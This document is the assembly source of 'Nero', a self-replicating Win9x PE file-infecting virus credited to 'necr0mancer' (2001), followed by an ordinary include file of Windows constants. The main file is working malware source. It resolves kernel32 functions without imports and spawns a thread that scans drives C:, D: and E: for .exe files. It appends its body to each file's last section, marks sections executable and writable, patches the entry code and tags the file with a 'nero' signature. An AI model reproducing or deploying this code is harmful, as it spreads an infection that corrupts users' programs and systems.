
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[NERO.ASM]컴�
include  INC\win.inc

includelib INC\import32.lib           ;(for message)
extrn	MessageBoxA:near
extrn	ExitProcess:near


        .386
        .model flat

        .data

	      dd  00
message_title db 'Nero - neyron hook , that eat your brain.',0

message       db 'Thread started.Files is scaning.',0dh,0dh
              db 'Copyleft (c) 2001 necr0mancer.',0dh
              db 'Have a nice day!',0
        .code

Original:
        db 5 dup(90h)
__msg:
        push MB_ICONEXCLAMATION
        push offset message_title
        push offset message
        push 0
        call MessageBoxA

        push    0
        call ExitProcess                               ; call    ExitProcess


_start:                                              


        push eax
        pushad
        pushfd
        call GetSuber
GetSuber:
    
        pop ebp
        sub ebp,offset GetSuber

        int 3
__begin:
        mov eax,[ebp+OldRVA]
        movzx ecx,byte ptr[ebp+_command]
        mov byte ptr[eax],cl

        mov ecx,[ebp+_address]
        mov [eax+1],ecx

        mov [esp+8*4+4],eax  		             ;FOR returning in prog

        mov eax,0BFF70000h
        cmp word ptr [eax],'ZM'                            
        jne no_yet                                   ;No win9x :(

        lea esi,[ebp+offset _Table]
        lea ebx,[ebp+offset _adr]
Ft_repeat:
    
        mov edi,esi
        call get_proc_adr

        cmp eax,0
        je  end_Ft_cycle

        mov [ebx],eax
        add ebx,4

Ft_cycle:
        lodsb
        cmp al,0ffh
        je  end_Ft_cycle

        cmp al,0
        jne Ft_cycle

        jmp Ft_repeat

end_Ft_cycle:
;-------------------------------------------------------------------------

        lea eax,[ebp+offset Thr_indefirer]
        push eax

        push 0
        push 0

        lea eax,[ebp+offset Thread_proc]
        push eax

        push 0
        push 0
        call [ebp+CreateThread]

        mov [ebp+our_ebp],ebp

no_yet:
        popfd
        popad
        retn                                         ;Return on original
                                                     ;entry point
Thread_proc:

        db 0bdh                                      ;Mov ebp.... 
        our_ebp dd 0  
             
        lea edi,[ebp+offset SearchRec]
        lea edx,[ebp+offset dirname]
        mov [edx],'\:E'
        call filefind

        mov [edx],'\:D'
        call filefind

        mov [edx],'\:C'
        call filefind

        mov eax,[ebp+Thr_indefirer]
        push eax
        call [ebp+ExitThread]


;=========================================================================================
;Input: edi=offset of string

get_proc_adr       proc

       pushad

       mov ebx,0BFF70000h                            ;kernel 32 adr

       mov ecx,[ebx+3ch]
       add ecx,ebx

       mov ecx,[ecx+78h]
       jecxz return_0

       add ecx,ebx                                   ;ecx-offset of export table

       xor esi,esi

_search:

       mov edx,[ecx+20h]                             ;offsets on Strings
       add edx,ebx                                   ;correct

       mov edx,[edx+esi*4]
       add edx,ebx

       push edi

_compare_strings:

       mov al,[edx]
       cmp al,[edi]
       jne _exit_compare

       or al,al
       jz  _exit_compare

       inc edi
       inc edx
       jmp _compare_strings

_exit_compare:

       pop  edi
       je _name_found

       inc esi
       cmp esi,[ecx+18h]
       jb _search

return_0:

       xor eax,eax
       jmp _return

_name_found:
                                                     ;esi=index on string table

       mov edx,[ecx+24h]
       add edx,ebx
       movzx edx, word ptr [edx+esi*2]

       mov eax,[ecx+1ch]
       add eax,ebx                                   ;correct

       mov eax,[eax+edx*4]
       add eax,ebx

_return:

       mov [esp+7*4],eax

       popad
       retn

get_proc_adr       endp


;-------------------------------
;Input:edx=offset of filename

fopen  proc

       pushad

       push 0
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push 0
       push FILE_SHARE_READ + FILE_SHARE_WRITE
       push GENERIC_READ + GENERIC_WRITE
       push edx
       call [ebp+CreateFile]

       cmp eax,-1
       je fo_error

       mov [esp+7*4], eax
       popad
       retn

fo_error:
       xor eax,eax
       mov [esp+7*4], eax

       popad
       retn
fopen  endp


;-------------------------------
;Input:ebx=handle

fclose proc

       pushad

       push ebx
       call [ebp+CloseHandle]

       popad
       retn
fclose endp


;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to read
;      edx=offset of bufer
;      ebx=handle to file

fread  proc

       pushad

       push 0

       lea eax,[ebp+offset bytesread]
       push eax

       push ecx
       push edx
       push ebx
       call [ebp+ReadFile]

       popad
       retn
fread  endp

;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to move

fseek  proc

       pushad

       push FILE_BEGIN
       push 0
       push ecx
       push ebx
       call [ebp+SetFilePointer]

       popad
       retn
fseek  endp



;-------------------------------
;Input:ebx=handle file
;      ecx=count of bytes to write
;      edi=offset of bufer

fwrite  proc

       pushad

       push 0

       lea eax,[ebp+offset bytesread]
       push eax

       push ecx
       push edi

       push ebx
       call [ebp+WriteFile]

       popad
       retn
fwrite  endp



;----------------------------------------------------------------------------------
;Input : edi=SearchRec structure
;        edx=dirname

filefind  proc
       pushad

       sub   esp,1024                ;for full directory name

       mov esi,edx		     ;esi=offset of dirname 	
       mov edi,esp                   ;edi=memory for FULL dirname

_scopy:
       lodsb                         ;mesi>al
       stosb                         ;medi<al
       or al,al
       jnz _scopy

       dec edi

       mov al,'\'
       cmp [edi-1],al
       je _estislesh
       stosb

_estislesh:
       mov esi,edi		     ;esi=position for file/dir	
 
       mov eax,'*.*'
       stosd
       mov eax,esp
 
       mov edi,[esp+1024]            ;restore edi
       push  edi

       push  eax

       call  [ebp+FindFirstFile]     ;eax=handle for search

       cmp   eax,-1                  ;if exist anybody?
       je    ff_quit

       xchg  ebx,eax		     ;search handle

ff_infect:

       pushad			     ;Sleep 500ms
       push 500
       call [ebp+Sleep]
       popad

       pushad
       xchg esi,edi                  ;edi=position of file/dir,esi=ff_struc
       lea esi,[esi].ff_fullname     ;esi=finded name
_sadd:
       lodsb                         ;string add
       stosb
       or al,al
       jnz _sadd
       popad

       mov edx,esp                   ;FULL name of file/dir

       test  byte ptr [edi].ff_attr, 16
       jnz   ff_dir                  ;dir?

       call  infect                  ;no dir,infect
       jmp ff_next

ff_dir:
       cmp  byte ptr [edi].ff_fullname,'.' 
       je   ff_next

       call filefind

ff_next:

       push edi
       push ebx
       call [ebp+FindNextFile]

       cmp  eax,0
       jne   ff_infect

ff_quit:

       push ebx
       call [ebp+FindClose]

       add esp,1024

       popad
       retn
filefind  endp


;==============================================================================
;Input: edx=offset of full finded name
infect  proc
       pushad

       mov esi,edx                  ;esi=edx=full name

_findzero:
       lodsb                         
       or al,al
       jnz _findzero
                                     ;esi=offset of null byte+1
       mov eax,[esi-4]

       cmp eax,00455845h	     ;EXE?
       je _gogo

       cmp eax,00657865h	     ;exe?
       jne no_EXE
_gogo:
       push edx

       push 10000                    ;alloc 10 kb
       push GMEM_FIXED
       call [ebp+GlobalAlloc]        ;eax=offset of getted memory

       mov [ebp+mem],eax             ;save handle

       pop edx
       call fopen

       cmp eax,0
       je i_close_exit

       xchg eax,ebx                  ;ebx=handle

       mov ecx,9000                  ;9 kb
       mov edx,[ebp+mem]
       call fread

;-----------------------------------------------
       movzx eax,word ptr [edx+18h]
       cmp eax,40h
       jne i_close_exit

       mov eax,[edx+3ch]
       add edx,eax                   ;EDX=offset of PE header
       mov eax,[edx]
       cmp eax,00004550h             ;PE00
       jne i_close_exit

       cmp word ptr[edx+28h],0       ;RVA=0?
       je i_close_exit               

       cmp 4 ptr [edx+08h],'nero'  
       je i_close_exit

;------------------------------------------------

       movzx eax,word ptr[edx+14h]   ;NT header size
       add eax,18h                   ;Size of PE-header
       add eax,edx                   ;Eax=offset of Object table
       mov [ebp+CodeSection],eax

       push eax
       push edx

       movzx eax,word ptr[edx+06h]   ;Number of objects 

       dec eax
       mov esi,40                    ;size of table

       mul esi                       ;result in EDX:EAX

       xchg esi,eax                  ;ESI=offset of last object

       pop edx
       pop eax

       add esi,eax                   ;correct(esi=last object)
       mov eax,[esi+8h]              ;Vsize

       mov edi,[esi+10h]             ;Fsize
       mov [ebp+Fsize],edi

       cmp eax,0
       je i_close_exit

       cmp edi,0
       je i_close_exit

       cmp eax,edi                   ;Vsize<Fsize
       jb i_close_exit

       mov eax,[esi+14h]             ;Foffset
       mov [ebp+Foff],eax

       mov eax,[esi+0Ch]             ;Voffset
       mov [ebp+Voff],eax            ;eax,edi,ecx 
                             
       add eax,[ebp+Fsize]           ;eax=virtual offset+physic size=new RVA

       mov ecx,[edx+34h]
       mov [ebp+imagebase],ecx

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       push edx
       push eax

       push 20000                    ;alloc 20 kb
       push GMEM_FIXED
       call [ebp+GlobalAlloc]        ;eax=offset of getted memory
       mov [ebp+memUEP],eax          ;save handle

;calculate physical RVA

       mov eax,[esp+4]               ;eax=header
       mov ecx,[eax+28h]             ;rva

       mov eax,[ebp+CodeSection]     ;eax=codesection
       sub ecx,[eax+0Ch]             ;va offset
       mov [eax+24h],0E0000000h      ;attributes

       mov eax,[eax+14h]             ;physical offset
       add ecx,eax                   ;physical RVA 
       mov [ebp+Prva],ecx
       call fseek

       mov ecx,20000-1               ;read to bufer after header       
       mov edx,[ebp+memUEP]
       call fread

       pop eax

       mov edx,[esp]                 ;peheader
       mov ecx,[edx+28h]             ;ecx=rva prog

       nop                           ;debug
       nop
       nop

       add  ecx,[ebp+imagebase]
       push ecx                      ;rva

       add  eax,[ebp+imagebase]
       push eax                      ;virstart

       push 19000                    ;size=19kb
       push [ebp+memUEP]             ;dump
       call CreateUEP

       cmp  eax,-1
       jne _inf_next

       pop edx
       jmp i_close_exit

_inf_next:
   
       mov byte ptr[ebp+_command],al     ;eax=command
       mov [ebp+_address],edx 		 ;edx=adress for jump
       mov [ebp+OldRVA],edi       	 ;edi=adress va

       mov ecx,[ebp+Prva]
       call fseek

       mov ecx,19000
       mov edi,[ebp+memUEP]
       call fwrite


       pop edx
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

       mov ecx,[edx+38h]             ;Virtual aligment
       mov eax,offset _endvbody-offset _start

       call Round
       add  [esi+08h],eax            ;Add virus size to section

       mov ecx,[edx+3Ch]             ;Physical aligment
       mov eax,offset _fbodyend-offset _start

       call Round
       add  [esi+10h],eax            ;Add virus size
       push eax			     ;for fwrite

       mov  eax,[esi+08h]             

       mov ecx,[ebp+Voff]            ;Virtual offset+virtualsize
       add ecx,eax
       mov [edx+50h],ecx             ;Correct imageSize

       mov [esi+24h],0E0000000h      ;attributes
       mov [edx+08h],'nero'          ;signature

;-----------------------------------------------
       xor ecx,ecx
       call fseek
;-----------------------------------------------
       mov ecx,9000
       mov edi,[ebp+mem]
       call fwrite
;-----------------------------------------------

       mov ecx,[ebp+Foff]
       add ecx,[ebp+Fsize]           ;Offset of end of last section

       call fseek

       pop ecx                       ;virsize
       lea edi,[ebp+_start]
       call fwrite

i_close_exit:

       call fclose

       mov eax,[ebp+memUEP]
       push eax
       call [ebp+GlobalFree]

       mov eax,[ebp+mem]
       push eax
       call [ebp+GlobalFree]

no_EXE:
       popad
       retn
infect  endp


;------------------------------------
;Input:ecx=field of rounding
;      eax=size
 
Round   proc
        pushad

        bsr ecx,eax                                  ;Scan backward for bit

        dec ecx

        shr eax,cl
        inc eax
        shl eax,cl

        mov [esp+7*4],eax                            ;Save for Output

        popad 
        retn
Round   endp



include jype32.inc


;----------------------------------data

imagebase      dd 00400000h

_Table:
               db 'CreateFileA',0
               db 'CloseHandle',0
               db 'ReadFile',0
               db 'WriteFile',0
               db 'SetFilePointer',0
               db 'FindFirstFileA',0
               db 'FindNextFileA',0
               db 'FindClose',0
               db 'GlobalAlloc',0
               db 'GlobalFree',0
               db 'CreateThread',0
               db 'ExitThread',0
               db 'Sleep',0

its_over       db 0FFh

OldRVA         dd offset Original
_command       db 0e9h
_address       dd 00000000h
fmask          db '*.exe',0
_fbodyend:

_adr:

CreateFile     dd ?           ;2
CloseHandle    dd ?           ;3
ReadFile       dd ?           ;4
WriteFile      dd ?           ;c
SetFilePointer dd ?           ;b
FindFirstFile  dd ?           ;6
FindNextFile   dd ?           ;7
FindClose      dd ?           ;8
GlobalAlloc    dd ?           ;9
GlobalFree     dd ?           ;a
CreateThread   dd ?           ;b
ExitThread     dd ?           ;c
Sleep          dd ?           ;d

;-------------------------------------

dirname        dd ?
bytesread      dd ?
kernelAdr      dd ?

mem            dd ?           ;for header
memUEP         dd ?           ;for Uep & first section 
                              

;--------------------PE---------------
Fsize	       dd ?
Voff 	       dd ?
Foff           dd ?  
CodeSection    dd ?
Prva           dd ?

Thr_indefirer  dd ?
SearchRec      f_struc<,,,,,,,>
_endvbody:



end     _start
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[NERO.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[WIN.INC]컴�
;Windows95/NT assembly language include file by SMT/SMF. All rights reserved.
;Modifed by Necr0mancer.No rights reserved.

NULL equ 0
TRUE equ 1
FALSE equ 0

MAX_PATH                equ 260
PIPE_WAIT               equ 00000000h
PIPE_NOWAIT             equ 00000001h
PIPE_READMODE_BYTE      equ 00000000h
PIPE_READMODE_MESSAGE   equ 00000002h
PIPE_TYPE_BYTE          equ 00000000h
PIPE_TYPE_MESSAGE       equ 00000004h
SC_SIZE         equ 0F000h
SC_MOVE         equ 0F010h
SC_MINIMIZE     equ 0F020h
SC_MAXIMIZE     equ 0F030h
SC_NEXTWINDOW   equ 0F040h
SC_PREVWINDOW   equ 0F050h
SC_CLOSE        equ 0F060h
SC_VSCROLL      equ 0F070h
SC_HSCROLL      equ 0F080h
SC_MOUSEMENU    equ 0F090h
SC_KEYMENU      equ 0F100h
SC_ARRANGE      equ 0F110h
SC_RESTORE      equ 0F120h
SC_TASKLIST     equ 0F130h
SC_SCREENSAVE   equ 0F140h
SC_HOTKEY       equ 0F150h
SC_DEFAULT      equ 0F160h
SC_MONITORPOWER equ 0F170h
SC_CONTEXTHELP  equ 0F180h
SC_SEPARATOR    equ 0F00Fh
                
WM_NULL                         equ 0000h
WM_CREATE                       equ 0001h
WM_DESTROY                      equ 0002h
WM_MOVE                         equ 0003h
WM_SIZE                         equ 0005h
WM_ACTIVATE                     equ 0006h
WA_INACTIVE                     equ 0
WA_ACTIVE                       equ 1
WA_CLICKACTIVE                  equ 2
WM_SETFOCUS                     equ 0007h
WM_KILLFOCUS                    equ 0008h
WM_ENABLE                       equ 000Ah
WM_SETREDRAW                    equ 000Bh
WM_SETTEXT                      equ 000Ch
WM_GETTEXT                      equ 000Dh
WM_GETTEXTLENGTH                equ 000Eh
WM_PAINT                        equ 000Fh
WM_CLOSE                        equ 0010h
WM_QUERYENDSESSION              equ 0011h
WM_QUIT                         equ 0012h
WM_QUERYOPEN                    equ 0013h
WM_ERASEBKGND                   equ 0014h
WM_SYSCOLORCHANGE               equ 0015h
WM_ENDSESSION                   equ 0016h
WM_SHOWWINDOW                   equ 0018h
WM_WININICHANGE                 equ 001Ah
WM_DEVMODECHANGE                equ 001Bh
WM_ACTIVATEAPP                  equ 001Ch
WM_FONTCHANGE                   equ 001Dh
WM_TIMECHANGE                   equ 001Eh
WM_CANCELMODE                   equ 001Fh
WM_SETCURSOR                    equ 0020h
WM_MOUSEACTIVATE                equ 0021h
WM_CHILDACTIVATE                equ 0022h
WM_QUEUESYNC                    equ 0023h
WM_GETMINMAXINFO                equ 0024h
WM_PAINTICON                    equ 0026h
WM_ICONERASEBKGND               equ 0027h
WM_NEXTDLGCTL                   equ 0028h
WM_SPOOLERSTATUS                equ 002Ah
WM_DRAWITEM                     equ 002Bh
WM_MEASUREITEM                  equ 002Ch
WM_DELETEITEM                   equ 002Dh
WM_VKEYTOITEM                   equ 002Eh
WM_CHARTOITEM                   equ 002Fh
WM_SETFONT                      equ 0030h
WM_GETFONT                      equ 0031h
WM_SETHOTKEY                    equ 0032h
WM_GETHOTKEY                    equ 0033h
WM_QUERYDRAGICON                equ 0037h
WM_COMPAREITEM                  equ 0039h
WM_COMPACTING                   equ 0041h
WM_COMMNOTIFY                   equ 0044h ; /* no longer suported */
WM_WINDOWPOSCHANGING            equ 0046h
WM_WINDOWPOSCHANGED             equ 0047h
WM_POWER                        equ 0048h
WM_COPYDATA                     equ 004Ah
WM_CANCELJOURNAL                equ 004Bh
WM_NOTIFY                       equ 004Eh
WM_INPUTLANGCHANGERequEST       equ 0050h
WM_INPUTLANGCHANGE              equ 0051h
WM_TCARD                        equ 0052h
WM_HELP                         equ 0053h
WM_USERCHANGED                  equ 0054h
WM_NOTIFYFORMAT                 equ 0055h
NFR_ANSI                        equ    1h
NFR_UNICODE                     equ    2h
NF_QUERY                        equ    3h
NF_RequERY                      equ    4h
WM_CONTEXTMENU                  equ 007Bh
WM_STYLECHANGING                equ 007Ch
WM_STYLECHANGED                 equ 007Dh
WM_DISPLAYCHANGE                equ 007Eh
WM_GETICON                      equ 007Fh
WM_SETICON                      equ 0080h
WM_NCCREATE                     equ 0081h
WM_NCDESTROY                    equ 0082h
WM_NCCALCSIZE                   equ 0083h
WM_NCHITTEST                    equ 0084h
WM_NCPAINT                      equ 0085h
WM_NCACTIVATE                   equ 0086h
WM_GETDLGCODE                   equ 0087h
WM_NCMOUSEMOVE                  equ 00A0h
WM_NCLBUTTONDOWN                equ 00A1h
WM_NCLBUTTONUP                  equ 00A2h
WM_NCLBUTTONDBLCLK              equ 00A3h
WM_NCRBUTTONDOWN                equ 00A4h
WM_NCRBUTTONUP                  equ 00A5h
WM_NCRBUTTONDBLCLK              equ 00A6h
WM_NCMBUTTONDOWN                equ 00A7h
WM_NCMBUTTONUP                  equ 00A8h
WM_NCMBUTTONDBLCLK              equ 00A9h
WM_KEYFIRST                     equ 0100h
WM_KEYDOWN                      equ 0100h
WM_KEYUP                        equ 0101h
WM_CHAR                         equ 0102h
WM_DEADCHAR                     equ 0103h
WM_SYSKEYDOWN                   equ 0104h
WM_SYSKEYUP                     equ 0105h
WM_SYSCHAR                      equ 0106h
WM_SYSDEADCHAR                  equ 0107h
WM_KEYLAST                      equ 0108h
WM_IME_STARTCOMPOSITION         equ 010Dh
WM_IME_ENDCOMPOSITION           equ 010Eh
WM_IME_COMPOSITION              equ 010Fh
WM_IME_KEYLAST                  equ 010Fh
WM_INITDIALOG                   equ 0110h
WM_COMMAND                      equ 0111h
WM_SYSCOMMAND                   equ 0112h
WM_TIMER                        equ 0113h
WM_HSCROLL                      equ 0114h
WM_VSCROLL                      equ 0115h
WM_INITMENU                     equ 0116h
WM_INITMENUPOPUP                equ 0117h
WM_MENUSELECT                   equ 011Fh
WM_MENUCHAR                     equ 0120h
WM_ENTERIDLE                    equ 0121h
WM_CTLCOLORMSGBOX               equ 0132h
WM_CTLCOLOREDIT                 equ 0133h
WM_CTLCOLORLISTBOX              equ 0134h
WM_CTLCOLORBTN                  equ 0135h
WM_CTLCOLORDLG                  equ 0136h
WM_CTLCOLORSCROLLBAR            equ 0137h
WM_CTLCOLORSTATIC               equ 0138h
WM_MOUSEFIRST                   equ 0200h
WM_MOUSEMOVE                    equ 0200h
WM_LBUTTONDOWN                  equ 0201h
WM_LBUTTONUP                    equ 0202h
WM_LBUTTONDBLCLK                equ 0203h
WM_RBUTTONDOWN                  equ 0204h
WM_RBUTTONUP                    equ 0205h
WM_RBUTTONDBLCLK                equ 0206h
WM_MBUTTONDOWN                  equ 0207h
WM_MBUTTONUP                    equ 0208h
WM_MBUTTONDBLCLK                equ 0209h
WM_MOUSEWHEEL                   equ 020Ah
WM_PARENTNOTIFY                 equ 0210h
MENULOOP_WINDOW                 equ    0h
MENULOOP_POPUP                  equ    1h
WM_ENTERMENULOOP                equ 0211h
WM_EXITMENULOOP                 equ 0212h
WM_SIZING                       equ 0214h
WM_CAPTURECHANGED               equ 0215h
WM_MOVING                       equ 0216h
WM_POWERBROADCAST               equ 0218h
WM_DEVICECHANGE                 equ 0219h
WM_IME_SETCONTEXT               equ 0281h
WM_IME_NOTIFY                   equ 0282h
WM_IME_CONTROL                  equ 0283h
WM_IME_COMPOSITIONFULL          equ 0284h
WM_IME_SELECT                   equ 0285h
WM_IME_CHAR                     equ 0286h
WM_IME_KEYDOWN                  equ 0290h
WM_IME_KEYUP                    equ 0291h
WM_MDICREATE                    equ 0220h
WM_MDIDESTROY                   equ 0221h
WM_MDIACTIVATE                  equ 0222h
WM_MDIRESTORE                   equ 0223h
WM_MDINEXT                      equ 0224h
WM_MDIMAXIMIZE                  equ 0225h
WM_MDITILE                      equ 0226h
WM_MDICASCADE                   equ 0227h
WM_MDIICONARRANGE               equ 0228h
WM_MDIGETACTIVE                 equ 0229h
WM_MDISETMENU                   equ 0230h
WM_ENTERSIZEMOVE                equ 0231h
WM_EXITSIZEMOVE                 equ 0232h
WM_DROPFILES                    equ 0233h
WM_MDIREFRESHMENU               equ 0234h
WM_MOUSEHOVER                   equ 02A1h
WM_MOUSELEAVE                   equ 02A3h
WM_CUT                          equ 0300h
WM_COPY                         equ 0301h
WM_PASTE                        equ 0302h
WM_CLEAR                        equ 0303h
WM_UNDO                         equ 0304h
WM_RENDERFORMAT                 equ 0305h
WM_RENDERALLFORMATS             equ 0306h
WM_DESTROYCLIPBOARD             equ 0307h
WM_DRAWCLIPBOARD                equ 0308h
WM_PAINTCLIPBOARD               equ 0309h
WM_VSCROLLCLIPBOARD             equ 030Ah
WM_SIZECLIPBOARD                equ 030Bh
WM_ASKCBFORMATNAME              equ 030Ch
WM_CHANGECBCHAIN                equ 030Dh
WM_HSCROLLCLIPBOARD             equ 030Eh
WM_QUERYNEWPALETTE              equ 030Fh
WM_PALETTEISCHANGING            equ 0310h
WM_PALETTECHANGED               equ 0311h
WM_HOTKEY                       equ 0312h
WM_PRINT                        equ 0317h
WM_PRINTCLIENT                  equ 0318h
WM_HANDHELDFIRST                equ 0358h
WM_HANDHELDLAST                 equ 035Fh
WM_AFXFIRST                     equ 0360h
WM_AFXLAST                      equ 037Fh
WM_PENWINFIRST                  equ 0380h
WM_PENWINLAST                   equ 038Fh
                                    
                                    
                                    
MB_OK                   equ             000000000h
MB_OKCANCEL             equ             000000001h
MB_ABORTRETRYIGNORE     equ             000000002h
MB_YESNOCANCEL          equ             000000003h
MB_YESNO                equ             000000004h
MB_RETRYCANCEL          equ             000000005h
MB_TYPEMASK             equ             00000000fh
MB_ICONHAND             equ             000000010h
MB_ICONQUESTION         equ             000000020h
MB_ICONEXCLAMATION      equ             000000030h
MB_ICONASTERISK         equ             000000040h
MB_ICONMASK             equ             0000000f0h
MB_ICONINFORMATION      equ             000000040h
MB_ICONSTOP             equ             000000010h
MB_DEFBUTTON1           equ             000000000h
MB_DEFBUTTON2           equ             000000100h
MB_DEFBUTTON3           equ             000000200h
MB_DEFMASK              equ             000000f00h
MB_APPLMODAL            equ             000000000h
MB_SYSTEMMODAL          equ             000001000h
MB_TASKMODAL            equ             000002000h
MB_NOFOCUS              equ             000008000h
IDNO                    equ             7
IDYES                   equ             6
IDCANCEL                equ             2
SB_HORZ                 equ     0
SB_VERT                 equ     1
SB_CTL                  equ     2
SB_BOTH                 equ     3
SB_THUMBPOSITION        equ     4
SB_ENDSCROLL            equ     8

SW_HIDE                 equ     00h
SW_SHOWNORMAL           equ     01h
SW_SHOWMINIMIZED        equ     02h
SW_SHOWMAXIMIZED        equ     03h
SW_SHOW                 equ     05h
SW_RESTORE              equ     09h
SW_SHOWDEFAULT          equ     0Ah
WM_USER                 equ     0400h

WS_POPUP                equ     080000000h
WS_CHILD                equ     040000000h
WS_MINIMIZE             equ     020000000h
WS_VISIBLE              equ     010000000h
WS_MAXIMIZE             equ     001000000h
WS_CAPTION              equ     000C00000h
WS_BORDER               equ     000800000h
WS_DLGFRAME             equ     000400000h
WS_VSCROLL              equ     000200000h
WS_HSCROLL              equ     000100000h
WS_SYSMENU              equ     000080000h
;WS_SIZEBOX             equ     000040000h
WS_MINIMIZEBOX          equ     000020000h
WS_MAXIMIZEBOX          equ     000010000h
WS_OVERLAPPEDWINDOW     equ     000CF0000h
WS_EX_NOPARENTNOTIFY    equ     000000004h
WS_EX_WINDOWEDGE        equ     000000100h
WS_EX_CLIENTEDGE        equ     000000200h
WS_EX_OVERLAPPEDWINDOW  equ     WS_EX_WINDOWEDGE + WS_EX_CLIENTEDGE

CS_VREDRAW              equ     00001h
CS_HREDRAW              equ     00002h
CS_PARENTDC             equ     00080h
CS_BYTEALIGNWINDOW      equ     02000h

BDR_RAISEDOUTER         equ     01h
BDR_SUNKENOUTER         equ     02h
BDR_RAISEDINNER         equ     04h
BDR_SUNKENINNER         equ     08h
EDGE_RAISED             equ     BDR_RAISEDOUTER + BDR_RAISEDINNER
EDGE_SUNKEN             equ     BDR_SUNKENOUTER + BDR_SUNKENINNER
EDGE_ETCHED             equ     BDR_SUNKENOUTER + BDR_RAISEDINNER
EDGE_BUMP               equ     BDR_RAISEDOUTER + BDR_SUNKENINNER
BF_LEFT                 equ     01h
BF_TOP                  equ     02h
BF_RIGHT                equ     04h
BF_BOTTOM               equ     08h
BF_RECT                 equ     BF_LEFT + BF_TOP + BF_RIGHT + BF_BOTTOM
IDOK                            equ     1
IDCANCEL                        equ     2
IDABORT                         equ     3
IDRETRY                         equ     4
IDIGNORE                        equ     5
IDYES                           equ     6
IDNO                            equ     7
IDCLOSE                         equ     8
IDHELP                          equ     9
COLOR_BTNFACE                        equ 15
DLGWINDOWEXTRA                       equ 30
IDC_ARROW                            equ 32512
WM_CTLCOLORDLG                       equ 136h
WM_SETFOCUS equ 7
WM_KEYFIRST                     equ     0100h
WM_KEYDOWN                      equ     0100h
WM_KEYUP                        equ     0101h
WM_CHAR                         equ     0102h
WM_DEADCHAR                     equ     0103h
WM_SYSKEYDOWN                   equ     0104h
WM_SYSKEYUP                     equ     0105h
WM_SYSCHAR                      equ     0106h
WM_SYSDEADCHAR                  equ     0107h
WM_KEYLAST                      equ     0108h
WM_SETICON equ 80h

DS_3DLOOK           equ 0004H
DS_FIXEDSYS         equ 0008H
DS_NOFAILCREATE     equ 0010H
DS_CONTROL          equ 0400H
DS_CENTER           equ 0800H
DS_CENTERMOUSE      equ 1000H
DS_CONTEXTHELP      equ 2000H
DS_ABSALIGN         equ 01h
DS_SYSMODAL         equ 02h
DS_LOCALEDIT        equ 20h
DS_SETFONT          equ 40h
DS_MODALFRAME       equ 80h
DS_NOIDLEMSG        equ 100h
DS_SETFOREGROUND    equ 200h

FILE_FLAG_WRITE_THROUGH         equ 80000000h
FILE_FLAG_OVERLAPPED            equ 40000000h
FILE_FLAG_NO_BUFFERING          equ 20000000h
FILE_FLAG_RANDOM_ACCESS         equ 10000000h
FILE_FLAG_SequENTIAL_SCAN       equ 08000000h
FILE_FLAG_DELETE_ON_CLOSE       equ 04000000h
FILE_FLAG_BACKUP_SEMANTICS      equ 02000000h
FILE_FLAG_POSIX_SEMANTICS       equ 01000000h

CREATE_NEW          equ 1
CREATE_ALWAYS       equ 2
OPEN_EXISTING       equ 3
OPEN_ALWAYS         equ 4
TRUNCATE_EXISTING   equ 5

GMEM_FIXED          equ 0000h
GMEM_MOVEABLE       equ 0002h
GMEM_NOCOMPACT      equ 0010h
GMEM_NODISCARD      equ 0020h
GMEM_ZEROINIT       equ 0040h
GMEM_MODIFY         equ 0080h
GMEM_DISCARDABLE    equ 0100h
GMEM_NOT_BANKED     equ 1000h
GMEM_SHARE          equ 2000h
GMEM_DDESHARE       equ 2000h
GMEM_NOTIFY         equ 4000h
GMEM_LOWER          equ GMEM_NOT_BANKED
GMEM_VALID_FLAGS    equ 7F72h
GMEM_INVALID_HANDLE equ 8000h


LMEM_FIXED          equ 0000h
LMEM_MOVEABLE       equ 0002h
LMEM_NOCOMPACT      equ 0010h
LMEM_NODISCARD      equ 0020h
LMEM_ZEROINIT       equ 0040h
LMEM_MODIFY         equ 0080h
LMEM_DISCARDABLE    equ 0F00h
LMEM_VALID_FLAGS    equ 0F72h
LMEM_INVALID_HANDLE equ 8000h
                    
LHND                equ (LMEM_MOVEABLE or LMEM_ZEROINIT)
LPTR                equ (LMEM_FIXED or LMEM_ZEROINIT)
                    
NONZEROLHND         equ (LMEM_MOVEABLE)
NONZEROLPTR         equ (LMEM_FIXED)
LMEM_DISCARDED      equ 4000h
LMEM_LOCKCOUNT      equ 00FFh
DRIVE_UNKNOWN     equ 0 
DRIVE_NO_ROOT_DIR equ 1 
DRIVE_REMOVABLE   equ 2 
DRIVE_FIXED       equ 3 
DRIVE_REMOTE      equ 4 
DRIVE_CDROM       equ 5 
DRIVE_RAMDISK     equ 6 
FILE_TYPE_UNKNOWN   equ 0000h
FILE_TYPE_DISK      equ 0001h
FILE_TYPE_CHAR      equ 0002h
FILE_TYPE_PIPE      equ 0003h
FILE_TYPE_REMOTE    equ 8000h

;================================ WINNT.H ===============
FILE_READ_DATA            equ ( 0001h )
FILE_LIST_DIRECTORY       equ ( 0001h )
FILE_WRITE_DATA           equ ( 0002h )
FILE_ADD_FILE             equ ( 0002h )
FILE_APPEND_DATA          equ ( 0004h )
FILE_ADD_SUBDIRECTORY     equ ( 0004h )
FILE_CREATE_PIPE_INSTANCE equ ( 0004h )
FILE_READ_EA              equ ( 0008h )
FILE_WRITE_EA             equ ( 0010h )
FILE_EXECUTE              equ ( 0020h )
FILE_TRAVERSE             equ ( 0020h )
FILE_DELETE_CHILD         equ ( 0040h )
FILE_READ_ATTRIBUTES      equ ( 0080h )
FILE_WRITE_ATTRIBUTES     equ ( 0100h )

;FILE_ALL_ACCESS      equ (STANDARD_RIGHTS_RequIRED or SYNCHRONIZE or 1FFh)
;FILE_GENERIC_READ    equ (STANDARD_RIGHTS_READ or FILE_READ_DATA or FILE_READ_ATTRIBUTES or FILE_READ_EA or SYNCHRONIZE)
